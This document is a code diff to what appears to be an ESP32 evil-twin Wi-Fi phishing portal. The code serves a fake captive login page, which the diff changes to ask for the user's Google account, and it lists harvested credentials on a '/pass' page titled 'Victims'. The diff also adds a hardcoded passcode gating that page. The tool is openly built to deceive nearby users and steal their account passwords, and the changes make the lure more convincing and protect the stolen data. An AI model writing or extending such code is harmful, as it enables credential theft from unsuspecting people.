@@ -7,13 +7,14 @@
 const char* SSID_NAME = "WiFi";
 const char* SUBTITLE = "Welcome!";
 const char* TITLE = "Login:";
-const char* BODY = "Log in with your Email account to access the network.";
+const char* BODY = "Log in with your Google account to access the network.";
 const char* POST_TITLE = "Validating...";
 const char* POST_BODY = "Your Email account is being validated. Please wait up to 3 minutes for device connection.<br>Thank you.";
 const char* PASS_TITLE = "Victims";
 const char* CLEAR_TITLE = "Cleared";
+const char* HEADER_TITLE = "WiFi";
 
-//System Settings
+// System Settings
 const byte HTTP_CODE = 200;
 const byte DNS_PORT = 53;
 const byte TICK_TIMER = 1000;
@@ -24,6 +25,9 @@ unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
 DNSServer dnsServer;
 WebServer webServer(80);
 
+// Set the password for accessing the /pass page
+const String passcode = "yourpassword";  // Replace this with your desired password 
+
 String input(String argName) {
   String a = webServer.arg(argName);
   a.replace("<", "&lt;");
@@ -33,11 +37,11 @@ String input(String argName) {
 }
 
 String footer() {
-  return "<br><footer><div><center><p>Copyright&#169; 2023 | All rights reserved.</p></center></div></footer>";
+  return "<br><footer><div><center><p>Copyright&#169; 2025 | All rights reserved.</p></center></div></footer>";
 }
 
 String header(String t) {
-  String a = String(SSID_NAME);
+  String a = String(HEADER_TITLE);
 
   String CSS = "#login-text { color: #808080;}"
                "header h1 { color: #ffffff; }"
@@ -62,7 +66,6 @@ String header(String t) {
   return h;
 }
 
-
 String pass() {
   return header(PASS_TITLE) + "<ol>" + Victims + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
 }
@@ -86,6 +89,14 @@ String clear() {
   return header(CLEAR_TITLE) + "<div><p>The Victims list has been cleared.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
 }
 
+// Page to enter password for accessing the /pass page
+String passLogin() {
+  return header("Password Required") + 
+         "<div><form action=/pass method=post>" +
+         "<b class=username-label> Enter Password: </b> <center> <input type=password name=password placeholder=password></center>" +
+         "<center><input type=submit value=Submit></center></form></div>" + footer();
+}
+
 void setup() {
   bootTime = lastActivity = millis();
 
@@ -99,8 +110,13 @@ void setup() {
     webServer.send(HTTP_CODE, "text/html", posted());
   });
 
+  // Add password protection for /pass page
   webServer.on("/pass", []() {
-    webServer.send(HTTP_CODE, "text/html", pass());
+    if (webServer.hasArg("password") && webServer.arg("password") == passcode) {
+      webServer.send(HTTP_CODE, "text/html", pass());
+    } else {
+      webServer.send(HTTP_CODE, "text/html", passLogin());
+    }
   });
 
   webServer.on("/clear", []() {
@@ -113,7 +129,6 @@ void setup() {
   });
 
   webServer.begin();
-
 }
 
 void loop() {
